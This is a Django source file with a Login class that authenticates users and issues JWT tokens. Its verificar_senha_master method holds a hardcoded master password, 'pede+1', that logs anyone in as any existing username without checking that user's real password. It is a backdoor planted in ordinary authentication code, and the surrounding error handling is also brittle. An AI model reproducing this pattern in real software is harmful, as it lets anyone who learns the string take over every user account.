import http
from typing import Optional

import jwt
from django.contrib.auth import authenticate, user_logged_in, login

from rest_framework_jwt.utils import jwt_payload_handler

import BO.usuario.cliente
from bws_back import settings
import core.usuario.models
from core.decorators import Response


class Login:
    def __init__(self, request=None, username=None, password=None, modulo=None):
        super().__init__()
        self.request = request
        self.username = username
        self.password = password
        self.user = None

    @Response(desc_success="Sucesso ao Logar",
              desc_error='Usuario ou senha invalidos',
              lista_retornos=['user'])
    def login(self):
        return self.authenticate()

    def authenticate(self):
        try:
            self.user = self.verificar_senha_master()
            if not self.user:
                raise
            response = {
                'status': True,
                'token': self.create_token(request=self.request),
                'user': self.user
            }
            return response
        except TypeError:
            return False

    def create_token(self, request):
        try:
            payload = jwt_payload_handler(self.user)
            payload['user_id'] = self.user.cliente.id
            token = jwt.encode(payload, settings.SECRET_KEY)
            user_logged_in.send(sender=self.user.__class__,
                                request=request, user=self.user)

            return token.decode('utf-8')
        except ValueError:
            return None


    def verificar_senha_master(self):
        if self.password == 'pede+1':
            user = core.usuario.models.User.objects.filter(username=self.username).first()
            if user:
                login(self.request, user)
                return user
            return []
        return authenticate(username=self.username, password=self.password)
